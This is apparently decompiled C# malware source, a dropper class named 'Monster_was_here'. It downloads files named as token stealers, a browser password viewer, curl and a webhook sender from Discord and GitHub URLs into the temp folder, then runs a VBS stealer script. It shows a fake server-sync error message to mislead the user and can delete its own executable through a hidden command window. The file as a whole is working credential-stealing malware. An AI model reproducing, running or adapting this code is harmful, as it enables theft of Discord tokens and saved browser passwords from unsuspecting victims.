using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

public class Monster_was_here
{
	public static void Main()
	{
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		string tempPath = Path.GetTempPath();
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/800573949011689495/800574276448157756/Token_Stealer.bat", tempPath + "finalres.bat");
		}
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/BETA---NOT-FOR-PUBLIC/AVOID%20ME/tokenstealer.vbs", tempPath + "finalres.vbs");
		}
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/BETA---NOT-FOR-PUBLIC/AVOID%20ME/tokenstealer2.vbs", tempPath + "finalres2.vbs");
		}
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/WebBrowserPassView.exe?raw=true", tempPath + "WebBrowserPassView.exe");
		}
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/curl-ca-bundle.crt", tempPath + "curl-ca-bundle.crt");
		}
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/curl.exe?raw=true", tempPath + "curl.exe");
		}
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://github.com/Itroublul/Find_Me/blob/main/Token-Browser-Password-Stealer-Creator-BETA-NOT-FOR-PUBLIC/AVOID%20ME/tempcurl.exe?raw=true", tempPath + "tempcurl.exe");
		}
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/800573949011689495/800574278345031710/sendhookfile.exe", tempPath + "filed.exe");
		}
		if (File.Exists(tempPath + "finalres.vbs"))
		{
			Process process = new Process();
			process.EnableRaisingEvents = false;
			process.StartInfo.FileName = tempPath + "finalres.vbs";
			process.Start();
			Thread.Sleep(1000);
		}
		else
		{
			MessageBox.Show("An error occured while syncing to our servers. Please try again later!");
		}
	}

	public static void RemoveEXE()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.get_ExecutablePath() + "\"";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
	}
}
